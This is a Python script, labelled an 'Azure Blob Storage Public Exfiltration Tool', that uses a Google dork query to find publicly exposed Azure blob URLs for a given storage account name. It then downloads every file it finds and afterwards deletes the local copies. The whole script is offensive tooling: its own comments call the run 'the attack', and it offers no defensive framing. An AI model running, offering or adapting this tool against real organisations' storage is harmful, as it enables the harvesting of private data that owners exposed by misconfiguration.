import os
import sys
import requests
from urllib.parse import urlparse
from bs4 import BeautifulSoup
from googlesearch import search

# Display a friendly banner
def display_banner():
    banner = """
    -------------------------------------------------------------
    📂 Azure Blob Storage Public Exfiltration Tool 🔍
    -------------------------------------------------------------
    ______ _       _    ______      _     _           
    | ___ \\ |     | |   | ___ \\    (_)   | |          
    | |_/ / | ___ | |__ | |_/ /__ _ _  __| | ___ _ __ 
    | ___ \\ |/ _ \\| '_ \\|    // _` | |/ _` |/ _ \\ '__|
    | |_/ / | (_) | |_) | |\\ \\ (_| | | (_| |  __/ |   
    \\____/|_|\\___/|_.__/|_| \\_\\__,_|_|\\__,_|\\___|_|   
                                                  
    -------------------------------------------------------------
    Author: AgentN1c0l3
    -------------------------------------------------------------
    """
    print(banner)

# Search Google for public Azure Blob Storage URLs
def find_blob_urls(storage_account_name):
    print(f"🔍 Searching for public blobs related to '{storage_account_name}'...")
    query = f'site:blob.core.windows.net "{storage_account_name}"'
    blob_urls = [url for url in search(query, num_results=10) if "blob.core.windows.net" in url]

    if blob_urls:
        print(f"✅ Found {len(blob_urls)} public blob URLs.")
    else:
        print(f"❌ No public blobs found for '{storage_account_name}'.")
    return blob_urls

# Download files from the identified blob URLs
def download_blob_files(blob_urls, folder_name):
    os.makedirs(folder_name, exist_ok=True)
    
    for url in blob_urls:
        try:
            # Fetch the file content from the blob
            response = requests.get(url)
            response.raise_for_status()
            
            # Extract the filename from the URL
            parsed_url = urlparse(url)
            filename = os.path.basename(parsed_url.path)
            file_path = os.path.join(folder_name, filename)
            
            # Save the file locally
            with open(file_path, "wb") as file:
                file.write(response.content)
            
            print(f"📥 Downloaded {filename} to {file_path}")
        except requests.exceptions.RequestException as e:
            print(f"⚠️ Failed to download {url}: {e}")

# Clean up by removing downloaded files
def cleanup_downloads(folder_name):
    if os.path.exists(folder_name):
        for filename in os.listdir(folder_name):
            file_path = os.path.join(folder_name, filename)
            os.remove(file_path)
            print(f"🧹 Removed {file_path}")

        os.rmdir(folder_name)
        print(f"🧼 Cleaned up the download folder '{folder_name}'.")

# Main function to execute the attack and then clean up
def main():
    display_banner()

    # Get the storage account name pattern from the user
    storage_account_name = input("Enter the storage account name or pattern to search for (e.g., 'dataBlob'): ")

    # Search for public blobs using Google Dorking
    blob_urls = find_blob_urls(storage_account_name)

    if blob_urls:
        # Download the files from the found blob URLs
        download_folder = storage_account_name + "_downloads"
        download_blob_files(blob_urls, download_folder)

        # Optionally clean up (comment out the next line if you don't want automatic cleanup)
        cleanup_downloads(download_folder)

if __name__ == '__main__':
    main()
